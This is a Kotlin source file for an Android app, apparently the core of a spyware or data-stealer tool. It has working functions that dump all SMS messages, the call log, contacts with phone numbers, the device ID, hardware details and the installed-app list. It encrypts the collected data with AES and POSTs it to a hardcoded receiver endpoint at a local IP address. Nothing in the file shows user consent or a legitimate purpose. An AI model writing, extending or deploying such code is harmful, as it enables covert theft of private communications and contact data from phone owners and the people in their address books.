
import android.annotation.SuppressLint
import android.content.ContentResolver
import android.content.Context
import android.database.Cursor
import android.os.Build
import android.os.Environment
import android.os.StatFs
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Settings
import android.provider.Telephony
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.security.Key
import java.util.Base64
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec

fun getSms(context: Context): String {
    val jsonArray = JSONArray()

    val uri = Telephony.Sms.CONTENT_URI
    val cursor = context.contentResolver.query(uri, null, null, null, null)

    cursor?.use {
        while (it.moveToNext()) {
            val jsonObject = JSONObject()
            for (i in 0 until it.columnCount) {
                val columnName = it.getColumnName(i)
                val value = it.getString(i)
                jsonObject.put(columnName, value)
            }
            jsonArray.put(jsonObject)
        }
    }

    return jsonArray.toString()
}

fun getCallLog(context: Context): String {
    val jsonArray = JSONArray()

    val uri = CallLog.Calls.CONTENT_URI
    val cursor = context.contentResolver.query(uri, null, null, null, null)

    cursor?.use {
        while (it.moveToNext()) {
            val jsonObject = JSONObject()
            for (i in 0 until it.columnCount) {
                val columnName = it.getColumnName(i)
                val value = it.getString(i)
                jsonObject.put(columnName, value)
            }
            jsonArray.put(jsonObject)
        }
    }

    return jsonArray.toString()
}


@SuppressLint("Range")
fun getContacts(context: Context): String {
    val jsonArray = JSONArray()

    val contentResolver = context.contentResolver
    val cursor: Cursor? = contentResolver.query(
        ContactsContract.Contacts.CONTENT_URI,
        null,
        null,
        null,
        null
    )

    cursor?.use {
        while (it.moveToNext()) {
            val contactId = it.getString(it.getColumnIndex(ContactsContract.Contacts._ID))
            val name = it.getString(it.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME))

            val jsonObject = JSONObject()
            jsonObject.put("ContactId", contactId)
            jsonObject.put("Name", name)

            val phoneNumbers = getContactPhoneNumbers(contentResolver, contactId)
            jsonObject.put("PhoneNumbers", JSONArray(phoneNumbers))

            jsonArray.put(jsonObject)
        }
    }

    return jsonArray.toString()
}

@SuppressLint("Range")
private fun getContactPhoneNumbers(
    contentResolver: ContentResolver,
    contactId: String
): ArrayList<String> {
    val phoneNumbers = ArrayList<String>()

    val phoneCursor: Cursor? = contentResolver.query(
        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
        null,
        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
        arrayOf(contactId),
        null
    )

    phoneCursor?.use {
        while (it.moveToNext()) {
            val phoneNumber =
                it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
            phoneNumbers.add(phoneNumber)
        }
    }

    return phoneNumbers
}


fun getFreeSpace(): String {
    val stat = StatFs(Environment.getExternalStorageDirectory().path)
    return (stat.availableBlocksLong * stat.blockSizeLong).toString()
}

@SuppressLint("QueryPermissionsNeeded")
fun getInstalledApps(context: Context): String {
    val packageManager = context.packageManager
    val installedApps = packageManager.getInstalledPackages(0)

    val appList = mutableListOf<String>()
    for (app in installedApps) {
        appList.add(app.packageName)
    }

    return appList.toString()
}



@SuppressLint("HardwareIds")
fun getSystemInfo(context: Context): String {
    val jsonObject = JSONObject()

    // Получение версии Android
    jsonObject.put("AndroidVersion", Build.VERSION.RELEASE)

    // Получение уникального идентификатора устройства
    val deviceId: String = Settings.Secure.getString(
        context.contentResolver,
        Settings.Secure.ANDROID_ID
    )
    jsonObject.put("DeviceId", deviceId)

    // Другие параметры, которые могут быть полезными
    jsonObject.put("DeviceModel", Build.MODEL)
    jsonObject.put("DeviceManufacturer", Build.MANUFACTURER)
    jsonObject.put("DeviceBrand", Build.BRAND)
    jsonObject.put("DeviceProduct", Build.PRODUCT)
    jsonObject.put("FreeSpace", getFreeSpace())
    jsonObject.put("InstalledApps", getInstalledApps(context))

    return jsonObject.toString()
}

@SuppressLint("GetInstance")
fun encrypt(input: String, key: String): String  {
    val keyBytes: Key = SecretKeySpec(key.toByteArray(), "AES")
    val cipher = Cipher.getInstance("AES/ECB/PKCS5Padding")
    cipher.init(Cipher.ENCRYPT_MODE, keyBytes)
    val encryptedData = cipher.doFinal(input.toByteArray())
    return Base64.getEncoder().encodeToString(encryptedData)

}

suspend fun sendEncryptedData(data: String) = withContext(Dispatchers.IO){
    val client = OkHttpClient()

    val jsonData = """
        {
            "encrypted_data": "$data"
        }
    """.trimIndent()

    val request = Request.Builder()
        .url("http://192.168.1.141:8000/api/v1/receiver")
        .post(RequestBody.create("application/json".toMediaTypeOrNull(), jsonData))
        .header("Connection", "close")
        .build()

    val response = client.newCall(request).execute()
}

